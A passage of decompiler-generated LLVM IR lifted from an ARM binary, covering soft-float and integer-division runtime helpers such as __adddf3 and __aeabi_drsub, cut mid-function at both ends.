dec_label_pc_1c408:                               ; preds = %dec_label_pc_1c400, %bb83
  %v6_1c430 = phi i32 [ %v0_1c438, %bb83 ], [ %v2_1c400, %dec_label_pc_1c400 ]
  %v1_1c40c = phi i32 [ %v1_1c414.v6_1c414.v6_1c41c.v6_1c424, %bb83 ], [ %v1_1c3c0, %dec_label_pc_1c400 ]
  %v3_1c42c12 = phi i32 [ %v3_1c42c, %bb83 ], [ %v1_1c3f4, %dec_label_pc_1c400 ]
  %v3_1c408 = icmp ult i32 %v1_1c40c, %v3_1c42c12
  %v3_1c40c = select i1 %v3_1c408, i32 0, i32 %v3_1c42c12
  %v1_1c414 = sub i32 %v1_1c40c, %v3_1c40c
  %v4_1c410 = udiv i32 %v3_1c42c12, 2
  %v6_1c410 = icmp ult i32 %v1_1c414, %v4_1c410
  %v6_1c414 = select i1 %v6_1c410, i32 0, i32 %v4_1c410
  %v1_1c414.v6_1c414 = sub i32 %v1_1c414, %v6_1c414
  %.demorgan = and i1 %v3_1c408, %v6_1c410
  %v4_1c418 = udiv i32 %v3_1c42c12, 4
  %v6_1c418 = icmp ult i32 %v1_1c414.v6_1c414, %v4_1c418
  %v6_1c41c = select i1 %v6_1c418, i32 0, i32 %v4_1c418
  %v1_1c414.v6_1c414.v6_1c41c = sub i32 %v1_1c414.v6_1c414, %v6_1c41c
  %.demorgan71 = and i1 %.demorgan, %v6_1c418
  %v4_1c420 = udiv i32 %v3_1c42c12, 8
  %v6_1c420 = icmp ult i32 %v1_1c414.v6_1c414.v6_1c41c, %v4_1c420
  %v6_1c424 = select i1 %v6_1c420, i32 0, i32 %v4_1c420
  %v1_1c414.v6_1c414.v6_1c41c.v6_1c424 = sub i32 %v1_1c414.v6_1c414.v6_1c41c, %v6_1c424
  %.demorgan72 = and i1 %.demorgan71, %v6_1c420
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_1c408
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_1c408, %bb80
  %v2_1c428 = add i32 %v1_1c414.v6_1c414.v6_1c41c.v6_1c424, -1
  %v4_1c428 = sub i32 0, %v1_1c414.v6_1c414.v6_1c41c.v6_1c424
  %v5_1c428 = and i32 %v1_1c414.v6_1c414.v6_1c41c.v6_1c424, %v4_1c428
  %v3_1c42c = udiv i32 %v3_1c42c12, 16
  %v5_1c430 = icmp slt i32 %v1_1c414.v6_1c414.v6_1c41c.v6_1c424, 1
  br i1 %v5_1c430, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_1c430 = add i32 %v6_1c430, -4
  %v9_1c430 = sub i32 3, %v6_1c430
  %v10_1c430 = and i32 %v9_1c430, %v6_1c430
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_1c438 = phi i32 [ %v6_1c430, %bb81 ], [ %v7_1c430, %bb82 ]
  %v0_1c43415.in = phi i32 [ %v2_1c428, %bb81 ], [ %v7_1c430, %bb82 ]
  %v1_1c43414.in = phi i32 [ %v5_1c428, %bb81 ], [ %v10_1c430, %bb82 ]
  %v1_1c43414 = icmp slt i32 %v1_1c43414.in, 0
  %v0_1c43415 = icmp slt i32 %v0_1c43415.in, 0
  %v2_1c434 = xor i1 %v0_1c43415, %v1_1c43414
  br i1 %v2_1c434, label %dec_label_pc_1c438, label %dec_label_pc_1c408

dec_label_pc_1c438:                               ; preds = %bb83
  %v1_1c438 = urem i32 %v0_1c438, 4
  %v2_1c438 = icmp eq i32 %v1_1c438, 0
  br i1 %v2_1c438, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_1c438
  %v3_1c43c = icmp eq i32 %v1_1c414.v6_1c414.v6_1c41c.v6_1c424, 0
  br i1 %v3_1c43c, label %bb76, label %dec_label_pc_1c444

dec_label_pc_1c444:                               ; preds = %bb84, %dec_label_pc_1c400
  %v0_1c458 = phi i32 [ %v3_1c42c, %bb84 ], [ %v1_1c3f4, %dec_label_pc_1c400 ]
  %v1_1c454 = phi i32 [ %v1_1c414.v6_1c414.v6_1c41c.v6_1c424, %bb84 ], [ %v1_1c3c0, %dec_label_pc_1c400 ]
  %v0_1c444 = phi i32 [ %v0_1c438, %bb84 ], [ %v2_1c400, %dec_label_pc_1c400 ]
  %v5_1c448 = icmp slt i32 %v0_1c444, -2
  br i1 %v5_1c448, label %dec_label_pc_1c468, label %dec_label_pc_1c44c

dec_label_pc_1c44c:                               ; preds = %dec_label_pc_1c444
  %v8_1c444 = icmp eq i32 %v0_1c444, -2
  br i1 %v8_1c444, label %dec_label_pc_1c45c, label %dec_label_pc_1c450

dec_label_pc_1c450:                               ; preds = %dec_label_pc_1c44c
  %v3_1c450 = icmp ult i32 %v1_1c454, %v0_1c458
  br i1 %v3_1c450, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_1c450
  %v2_1c450 = sub i32 %v1_1c454, %v0_1c458
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1c450, %bb85
  %v0_1c45c52 = phi i32 [ %v1_1c454, %dec_label_pc_1c450 ], [ %v2_1c450, %bb85 ]
  %v3_1c458 = udiv i32 %v0_1c458, 2
  br label %dec_label_pc_1c45c

dec_label_pc_1c45c:                               ; preds = %dec_label_pc_1c44c, %bb86
  %v0_1c464 = phi i32 [ %v0_1c458, %dec_label_pc_1c44c ], [ %v3_1c458, %bb86 ]
  %v1_1c460 = phi i32 [ %v1_1c454, %dec_label_pc_1c44c ], [ %v0_1c45c52, %bb86 ]
  %v3_1c45c = icmp ult i32 %v1_1c460, %v0_1c464
  br i1 %v3_1c45c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_1c45c
  %v2_1c45c = sub i32 %v1_1c460, %v0_1c464
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_1c45c, %bb87
  %v0_1c46855 = phi i32 [ %v1_1c460, %dec_label_pc_1c45c ], [ %v2_1c45c, %bb87 ]
  %v3_1c464 = udiv i32 %v0_1c464, 2
  br label %dec_label_pc_1c468

dec_label_pc_1c468:                               ; preds = %dec_label_pc_1c444, %bb88
  %v2_1c46c = phi i32 [ %v0_1c458, %dec_label_pc_1c444 ], [ %v3_1c464, %bb88 ]
  %v1_1c46c = phi i32 [ %v1_1c454, %dec_label_pc_1c444 ], [ %v0_1c46855, %bb88 ]
  %v3_1c468 = icmp ult i32 %v1_1c46c, %v2_1c46c
  br i1 %v3_1c468, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_1c468
  %v2_1c468 = sub i32 %v1_1c46c, %v2_1c46c
  br label %bb76

dec_label_pc_1c474:                               ; preds = %entry
  %v0_1c474 = load i32, i32* @lr, align 4
  %v0_1c478 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1c474)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1c46c, { 1, 2, 0 }
  uselistorder i32 %v0_1c458, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_1c438, { 1, 0, 2 }
  uselistorder i32 %v7_1c430, { 1, 0 }
  uselistorder i32 %v3_1c42c, { 1, 0 }
  uselistorder i32 %v1_1c414.v6_1c414.v6_1c41c.v6_1c424, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_1c420, { 1, 0 }
  uselistorder i32 %v4_1c418, { 1, 0 }
  uselistorder i32 %v4_1c410, { 1, 0 }
  uselistorder i32 %v6_1c430, { 3, 0, 2, 1 }
  uselistorder i32 %v2_1c400, { 1, 0 }
  uselistorder i32 %v1_1c3f4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_1c3e0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1c3ec.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1c3c0, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32 -3, { 3, 16, 0, 2, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32 268435455, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_1c468, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_1c45c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_1c408, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__aeabi_drsub(i32 %arg1, double %arg2) local_unnamed_addr {
entry:
  %v1_1c484 = sub i32 0, %arg1
  %v2_1c484 = sext i32 %v1_1c484 to i64
  %v3_1c488 = bitcast i64 %v2_1c484 to double
  %v9_1c488 = fadd double %v3_1c488, %arg2
  %v10_1c488 = fptrunc double %v9_1c488 to float
  %v11_1c488 = bitcast float %v10_1c488 to i32
  ret i32 %v11_1c488
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1c48c = load i32, i32* @r0, align 4
  ret i32 %v2_1c48c
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1c490 = load i32, i32* @r4, align 4
  store i32 %v3_1c490, i32* %stack_var_-12, align 4
  %v6_1c490 = load i32, i32* @r5, align 4
  %v0_1c494 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c494 = mul i32 %v0_1c494, 2
  store i32 %v2_1c494, i32* %r4.global-to-local, align 4
  %v0_1c498 = load i32, i32* %r2.global-to-local, align 4
  %v2_1c498 = mul i32 %v0_1c498, 2
  store i32 %v2_1c498, i32* %r5.global-to-local, align 4
  %v4_1c49c = icmp eq i32 %v2_1c498, %v2_1c494
  %v1_1c4a0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v4_1c49c, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1c4a0 = load i32, i32* %r3.global-to-local, align 4
  %v5_1c4a0 = icmp eq i32 %v2_1c4a0, %v1_1c4a0
  br i1 %v5_1c4a0, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1c4a4 = or i32 %v1_1c4a0, %v2_1c494
  %v5_1c4a4 = icmp eq i32 %v3_1c4a4, 0
  br i1 %v5_1c4a4, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_1c4a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_1c4a8 = or i32 %v2_1c4a8, %v2_1c498
  %v5_1c4a8 = icmp eq i32 %v3_1c4a8, 0
  br i1 %v5_1c4a8, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1c494.off = add i32 %v2_1c494, 4194303
  %tmp = icmp ult i32 %v2_1c494.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_1c498.off = add i32 %v2_1c498, 4194303
  %tmp18 = icmp ult i32 %v2_1c498.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_1c4b4 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1c4b4, i32 ptrtoint (i32* @global_var_1c6d4.1093 to i32))
  %v0_1c4b8 = load i32, i32* %r4.global-to-local, align 4
  %v3_1c4b8 = udiv i32 %v0_1c4b8, 2097152
  store i32 %v3_1c4b8, i32* %r4.global-to-local, align 4
  %v1_1c4bc = load i32, i32* %r5.global-to-local, align 4
  %v4_1c4bc = udiv i32 %v1_1c4bc, 2097152
  %v5_1c4bc = sub nsw i32 %v4_1c4bc, %v3_1c4b8
  %v5_1c4c0 = icmp ult i32 %v4_1c4bc, %v3_1c4b8
  br i1 %v5_1c4c0, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_1c4c0 = sub nsw i32 0, %v5_1c4bc
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_1c4c0, %bb14 ], [ %v5_1c4bc, %.thread3 ]
  %v1_1c520 = phi i32 [ %v7_1c4c0, %bb14 ], [ %v5_1c4bc, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1c4c4 = icmp ugt i32 %v4_1c4bc, %v3_1c4b8
  br i1 %v7_1c4c4, label %dec_label_pc_1c4c8, label %dec_label_pc_1c4e4

dec_label_pc_1c4c8:                               ; preds = %bb15
  %v2_1c4c8 = add nsw i32 %v1_1c520, %v3_1c4b8
  store i32 %v2_1c4c8, i32* %r4.global-to-local, align 4
  %v0_1c4cc = load i32, i32* %r1.global-to-local, align 4
  %v1_1c4cc = load i32, i32* %r3.global-to-local, align 4
  %v0_1c4d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c4d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1c4cc, i32* %r1.global-to-local, align 4
  store i32 %v1_1c4d0, i32* %r0.global-to-local, align 4
  store i32 %v0_1c4cc, i32* %r3.global-to-local, align 4
  store i32 %v0_1c4d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c4e4

dec_label_pc_1c4e4:                               ; preds = %bb15, %dec_label_pc_1c4c8
  %v0_1c520 = phi i32 [ %v3_1c4b8, %bb15 ], [ %v2_1c4c8, %dec_label_pc_1c4c8 ]
  %tmp19 = icmp ugt i32 %v1_1c520, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_1c4e4
  %v6_1c4e8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1c4e8, i32* %r4.global-to-local, align 4
  store i32 %v6_1c490, i32* %r5.global-to-local, align 4
  %v15_1c4e8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_1c4e8

bb17:                                             ; preds = %dec_label_pc_1c4e4
  %v0_1c4ec = load i32, i32* %r0.global-to-local, align 4
  %v3_1c4ec = icmp sgt i32 %v0_1c4ec, -1
  %v4_1c4f8 = urem i32 %v0_1c4ec, 1048576
  %v5_1c4f8 = or i32 %v4_1c4f8, 1048576
  store i32 %v5_1c4f8, i32* %r0.global-to-local, align 4
  br i1 %v3_1c4ec, label %dec_label_pc_1c508, label %dec_label_pc_1c500

dec_label_pc_1c500:                               ; preds = %bb17
  %v0_1c500 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c500 = sub i32 0, %v0_1c500
  store i32 %v1_1c500, i32* %r1.global-to-local, align 4
  %v2_1c500 = icmp eq i32 %v0_1c500, 0
  %v2_1c504 = icmp eq i1 %v2_1c500, false
  %v5_1c504 = sext i1 %v2_1c504 to i32
  %v6_1c504 = sub nsw i32 %v5_1c504, %v5_1c4f8
  store i32 %v6_1c504, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c508

dec_label_pc_1c508:                               ; preds = %bb17, %dec_label_pc_1c500
  %v0_1c508 = load i32, i32* %r2.global-to-local, align 4
  %v3_1c508 = icmp sgt i32 %v0_1c508, -1
  %v4_1c510 = urem i32 %v0_1c508, 1048576
  %v5_1c510 = or i32 %v4_1c510, 1048576
  store i32 %v5_1c510, i32* %r2.global-to-local, align 4
  br i1 %v3_1c508, label %dec_label_pc_1c520, label %dec_label_pc_1c518

dec_label_pc_1c518:                               ; preds = %dec_label_pc_1c508
  %v0_1c518 = load i32, i32* %r3.global-to-local, align 4
  %v1_1c518 = sub i32 0, %v0_1c518
  store i32 %v1_1c518, i32* %r3.global-to-local, align 4
  %v2_1c518 = icmp eq i32 %v0_1c518, 0
  %v2_1c51c = icmp eq i1 %v2_1c518, false
  %v5_1c51c = sext i1 %v2_1c51c to i32
  %v6_1c51c = sub nsw i32 %v5_1c51c, %v5_1c510
  store i32 %v6_1c51c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c520

dec_label_pc_1c520:                               ; preds = %dec_label_pc_1c508, %dec_label_pc_1c518
  %v4_1c520 = icmp eq i32 %v0_1c520, %v1_1c520
  call void @__pseudo_cond_branch(i1 %v4_1c520, i32 ptrtoint (i32* @global_var_1c6bc.1094 to i32))
  %v1_1c524 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1c524

; uselistorder directives
  uselistorder i32 %v0_1c508, { 1, 0 }
  uselistorder i32 %v0_1c4ec, { 1, 0 }
  uselistorder i32 %v4_1c4bc, { 2, 1, 0 }
  uselistorder i32 %v3_1c4b8, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_1c4a0, { 1, 0 }
  uselistorder i32 %v2_1c498, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1c494, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 7, 6, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c520, { 1, 0 }
  uselistorder label %dec_label_pc_1c508, { 1, 0 }
  uselistorder label %dec_label_pc_1c4e4, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1c528() local_unnamed_addr {
dec_label_pc_1c528:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1c528 = load i32, i32* @r4, align 4
  %v1_1c528 = add i32 %v0_1c528, -1
  store i32 %v1_1c528, i32* @r4, align 4
  %v0_1c52c = load i32, i32* @r5, align 4
  %v1_1c52c = sub i32 32, %v0_1c52c
  %v5_1c530 = icmp sgt i32 %v0_1c52c, 32
  br i1 %v5_1c530, label %dec_label_pc_1c54c, label %dec_label_pc_1c534

dec_label_pc_1c534:                               ; preds = %dec_label_pc_1c528
  %v0_1c534 = load i32, i32* @r3, align 4
  %v6_1c534 = shl i32 %v0_1c534, %v1_1c52c
  store i32 %v6_1c534, i32* %ip.global-to-local, align 4
  %v0_1c538 = load i32, i32* @r1, align 4
  %v3_1c538 = add i32 %v0_1c52c, -1
  %v4_1c538 = shl i32 1, %v3_1c538
  %v7_1c538 = lshr i32 %v0_1c534, %v0_1c52c
  %v8_1c538 = add i32 %v0_1c538, %v7_1c538
  %v9_1c538 = icmp ult i32 %v8_1c538, %v0_1c538
  %v0_1c53c = load i32, i32* @r0, align 4
  %v2_1c53c = zext i1 %v9_1c538 to i32
  %v3_1c53c = add i32 %v2_1c53c, %v0_1c53c
  %v1_1c540 = load i32, i32* @r2, align 4
  %v7_1c540 = shl i32 %v1_1c540, %v1_1c52c
  %v8_1c540 = add i32 %v7_1c540, %v8_1c538
  store i32 %v8_1c540, i32* %r1.global-to-local, align 4
  %v5_1c544 = and i32 %v1_1c540, %v4_1c538
  %v6_1c544 = icmp ne i32 %v5_1c544, 0
  %v7_1c544 = ashr i32 %v1_1c540, %v0_1c52c
  %v9_1c544 = add i32 %v3_1c53c, %v7_1c544
  %v10_1c544 = zext i1 %v6_1c544 to i32
  %v11_1c544 = add i32 %v10_1c544, %v9_1c544
  br label %dec_label_pc_1c568

dec_label_pc_1c54c:                               ; preds = %dec_label_pc_1c528
  %v1_1c54c = add i32 %v0_1c52c, -32
  %v1_1c550 = add i32 %v1_1c52c, 32
  %v0_1c558 = load i32, i32* @r2, align 4
  %v2_1c558 = add i32 %v1_1c52c, 31
  %v3_1c558 = lshr i32 -2147483648, %v2_1c558
  %v4_1c558 = and i32 %v0_1c558, %v3_1c558
  %v5_1c558 = icmp ne i32 %v4_1c558, 0
  %v6_1c558 = shl i32 %v0_1c558, %v1_1c550
  %v2_1c55c = or i32 %v6_1c558, 2
  %v2_1c55c.v6_1c558 = select i1 %v5_1c558, i32 %v2_1c55c, i32 %v6_1c558
  store i32 %v2_1c55c.v6_1c558, i32* %ip.global-to-local, align 4
  %v0_1c560 = load i32, i32* @r1, align 4
  %v7_1c560 = ashr i32 %v0_1c558, %v1_1c54c
  %v8_1c560 = add i32 %v0_1c560, %v7_1c560
  store i32 %v8_1c560, i32* %r1.global-to-local, align 4
  %v0_1c564 = load i32, i32* @r0, align 4
  %v2_1c564 = and i32 %v0_1c558, 1073741824
  %v3_1c564 = icmp ne i32 %v2_1c564, 0
  %v4_1c564 = ashr i32 %v0_1c558, 31
  %v6_1c564 = add i32 %v0_1c564, %v4_1c564
  %v7_1c564 = zext i1 %v3_1c564 to i32
  %v8_1c564 = add i32 %v6_1c564, %v7_1c564
  br label %dec_label_pc_1c568

dec_label_pc_1c568:                               ; preds = %dec_label_pc_1c534, %dec_label_pc_1c54c
  %storemerge = phi i32 [ %v11_1c544, %dec_label_pc_1c534 ], [ %v8_1c564, %dec_label_pc_1c54c ]
  %v0_1c568 = phi i32 [ %v11_1c544, %dec_label_pc_1c534 ], [ %v8_1c564, %dec_label_pc_1c54c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1c568 = and i32 %v0_1c568, -2147483648
  store i32 %v1_1c568, i32* @r5, align 4
  %v1_1c56c = icmp sgt i32 %v0_1c568, -1
  call void @__pseudo_cond_branch(i1 %v1_1c56c, i32 ptrtoint (i32* @global_var_1c57c.1095 to i32))
  %v0_1c570 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c570 = sub i32 0, %v0_1c570
  store i32 %v1_1c570, i32* %ip.global-to-local, align 4
  %v2_1c570 = icmp eq i32 %v0_1c570, 0
  %v0_1c574 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c574 = icmp eq i1 %v2_1c570, false
  %v5_1c574 = sext i1 %v2_1c574 to i32
  %v6_1c574 = sub i32 %v5_1c574, %v0_1c574
  store i32 %v6_1c574, i32* @r1, align 4
  %v7_1c574 = zext i1 %v2_1c574 to i32
  %v8_1c574 = icmp ne i32 %v6_1c574, %v7_1c574
  %v9_1c574 = icmp ne i32 %v0_1c574, -1
  %v10_1c574 = or i1 %v9_1c574, %v8_1c574
  %v11_1c574 = icmp ne i32 %v0_1c574, 0
  %v12_1c574 = select i1 %v2_1c574, i1 %v10_1c574, i1 %v11_1c574
  %v0_1c578 = load i32, i32* %r0.global-to-local, align 4
  %v5_1c578 = sext i1 %v12_1c574 to i32
  %v6_1c578 = sub i32 %v5_1c578, %v0_1c578
  store i32 %v6_1c578, i32* %r0.global-to-local, align 4
  ret i32 %v6_1c578

; uselistorder directives
  uselistorder i1 %v2_1c574, { 1, 2, 0 }
  uselistorder i32 %v0_1c574, { 1, 2, 0 }
  uselistorder i32 %v8_1c564, { 1, 0 }
  uselistorder i32 %v0_1c558, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1c544, { 1, 0 }
  uselistorder i32 %v1_1c540, { 1, 0, 2 }
  uselistorder i32 %v0_1c538, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1c568, { 1, 0 }
}

define i32 @function_1c57c(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1c57c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_1c580 = icmp ult i32 %arg1, 1048574
  br i1 %v3_1c580, label %dec_label_pc_1c5c0, label %dec_label_pc_1c584

dec_label_pc_1c584:                               ; preds = %dec_label_pc_1c57c
  %v3_1c588 = icmp ult i32 %arg1, 2097150
  br i1 %v3_1c588, label %dec_label_pc_1c5a8, label %dec_label_pc_1c58c

dec_label_pc_1c58c:                               ; preds = %dec_label_pc_1c584
  %v1_1c58c = urem i32 %arg1, 2
  %v2_1c58c = icmp ne i32 %v1_1c58c, 0
  %v3_1c58c = udiv i32 %arg1, 2
  store i32 %v3_1c58c, i32* %r0.global-to-local, align 4
  %v0_1c590 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c590 = zext i1 %v2_1c58c to i32
  %v6_1c590 = zext i32 %v0_1c590 to i64
  %v7_1c590 = sub i32 33, %v0_1c590
  %v8_1c590 = zext i32 %v7_1c590 to i64
  %v9_1c590 = shl i64 %v6_1c590, %v8_1c590
  %v10_1c590 = sub i32 32, %v0_1c590
  %v11_1c590 = shl i32 %v3_1c590, %v10_1c590
  %v12_1c590 = zext i32 %v11_1c590 to i64
  %v14_1c590 = or i64 %v12_1c590, %v9_1c590
  %v15_1c590 = trunc i64 %v14_1c590 to i32
  %v16_1c590 = add i32 %v0_1c590, -1
  %v17_1c590 = shl i32 1, %v16_1c590
  %v18_1c590 = and i32 %v17_1c590, %v0_1c590
  %v19_1c590 = icmp ne i32 %v18_1c590, 0
  store i32 %v15_1c590, i32* %r1.global-to-local, align 4
  %v0_1c594 = load i32, i32* @ip, align 4
  %v3_1c594 = zext i1 %v19_1c590 to i32
  %v6_1c594 = zext i32 %v0_1c594 to i64
  %v7_1c594 = sub i32 33, %v0_1c594
  %v8_1c594 = zext i32 %v7_1c594 to i64
  %v9_1c594 = shl i64 %v6_1c594, %v8_1c594
  %v10_1c594 = sub i32 32, %v0_1c594
  %v11_1c594 = shl i32 %v3_1c594, %v10_1c594
  %v12_1c594 = zext i32 %v11_1c594 to i64
  %v14_1c594 = or i64 %v12_1c594, %v9_1c594
  %v15_1c594 = trunc i64 %v14_1c594 to i32
  store i32 %v15_1c594, i32* @ip, align 4
  %v0_1c598 = load i32, i32* @r4, align 4
  %v1_1c598 = add i32 %v0_1c598, 1
  store i32 %v1_1c598, i32* @r4, align 4
  %v3_1c59c = mul i32 %v1_1c598, 2097152
  %v2_1c5a0 = icmp ugt i32 %v3_1c59c, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1c5a0, i32 ptrtoint (i32* @global_var_1c734.1096 to i32))
  br label %dec_label_pc_1c5a8

dec_label_pc_1c5a8:                               ; preds = %dec_label_pc_1c5c0, %dec_label_pc_1c584, %dec_label_pc_1c58c
  %v0_1c5a8 = load i32, i32* @ip, align 4
  %v2_1c5a8 = icmp slt i32 %v0_1c5a8, 0
  %v6_1c5a8 = icmp eq i32 %v0_1c5a8, -2147483648
  %v1_1c5ac = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_1c5a8, label %bb, label %dec_label_pc_1c5a8._crit_edge

bb:                                               ; preds = %dec_label_pc_1c5a8
  %v2_1c5ac = urem i32 %v1_1c5ac, 2
  %v3_1c5ac = icmp ne i32 %v2_1c5ac, 0
  br label %dec_label_pc_1c5a8._crit_edge

dec_label_pc_1c5a8._crit_edge:                    ; preds = %dec_label_pc_1c5a8, %bb
  %v1_1c5b0 = phi i1 [ %v3_1c5ac, %bb ], [ %v2_1c5a8, %dec_label_pc_1c5a8 ]
  %v2_1c5b0 = zext i1 %v1_1c5b0 to i32
  %v3_1c5b0 = add i32 %v2_1c5b0, %v1_1c5ac
  store i32 %v3_1c5b0, i32* %r1.global-to-local, align 4
  %v0_1c5b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c5b4 = load i32, i32* @r4, align 4
  %v2_1c5b4 = and i32 %v1_1c5b4, 4096
  %v3_1c5b4 = icmp ne i32 %v2_1c5b4, 0
  %v4_1c5b4 = mul i32 %v1_1c5b4, 1048576
  %v6_1c5b4 = add i32 %v4_1c5b4, %v0_1c5b4
  %v7_1c5b4 = zext i1 %v3_1c5b4 to i32
  %v8_1c5b4 = add i32 %v7_1c5b4, %v6_1c5b4
  %v1_1c5b8 = load i32, i32* @r5, align 4
  %v2_1c5b8 = or i32 %v1_1c5b8, %v8_1c5b4
  store i32 %v2_1c5b8, i32* %r0.global-to-local, align 4
  ret i32 %v2_1c5b8

dec_label_pc_1c5c0:                               ; preds = %dec_label_pc_1c57c
  %v0_1c5c0 = load i32, i32* @ip, align 4
  %v1_1c5c0 = icmp slt i32 %v0_1c5c0, 0
  %v2_1c5c0 = mul i32 %v0_1c5c0, 2
  store i32 %v2_1c5c0, i32* @ip, align 4
  %v0_1c5c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c5c4 = mul i32 %v0_1c5c4, 2
  %v4_1c5c4 = zext i1 %v1_1c5c0 to i32
  %v5_1c5c4 = or i32 %v3_1c5c4, %v4_1c5c4
  store i32 %v5_1c5c4, i32* %r1.global-to-local, align 4
  %v9_1c5c4 = icmp ule i32 %v5_1c5c4, %v0_1c5c4
  %v10_1c5c4 = icmp ult i32 %v3_1c5c4, %v0_1c5c4
  %v11_1c5c4 = select i1 %v1_1c5c0, i1 %v9_1c5c4, i1 %v10_1c5c4
  %v3_1c5c8 = mul i32 %arg1, 2
  %v4_1c5c8 = zext i1 %v11_1c5c4 to i32
